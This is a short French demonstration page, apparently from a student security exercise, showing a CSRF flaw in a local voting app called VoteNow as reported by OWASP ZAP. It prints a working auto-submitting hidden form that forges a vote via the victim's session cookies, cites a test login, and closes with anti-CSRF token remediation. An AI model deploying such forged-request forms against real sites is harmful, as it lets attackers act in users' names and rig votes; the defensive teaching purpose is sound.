Simulation Page Piégée Externe Retour VoteNow

🎯 Démonstration Faille CSRF - Vote Forcé

Alerte OWASP ZAP : Absence de Jetons Anti-CSRF (Anti-CSRF Tokens Missing)

Scénario d'Exploitation :

Un étudiant légitimement connecté sur VoteNow clique sur un lien malveillant ou visite un site externe piégé. Sans son consentement explicite, le script ci-dessous soumet une requête POST vers /api/votes.php pour forcer son vote en faveur d'un candidat prédéfini !

Code HTML/JS du Formulaire Attaquant :

<!-- Requête forgée exécutée avec les cookies de session de la victime --> <form id="csrfForm" action="http://127.0.0.1:8000/api/votes.php" method="POST"> <input type="hidden" name="election_id" value="1"> <input type="hidden" name="candidature_id" value="1"> </form> <script> // Déclenchement automatique de la soumission du vote document.getElementById('csrfForm').submit(); </script>

*Nécessite d'être préalablement connecté avec un compte électeur (ex: SN-2024-001 / test123).

Remédiation Technique :

Intégrer un jeton de synchronisation anti-CSRF (Synchronizer Token Pattern) : chaque formulaire et chaque appel API d'action doit inclure un jeton cryptographiquement imprévisible stocké dans $_SESSION['csrf_token'] et validé avec hash_equals() avant tout enregistrement en base.
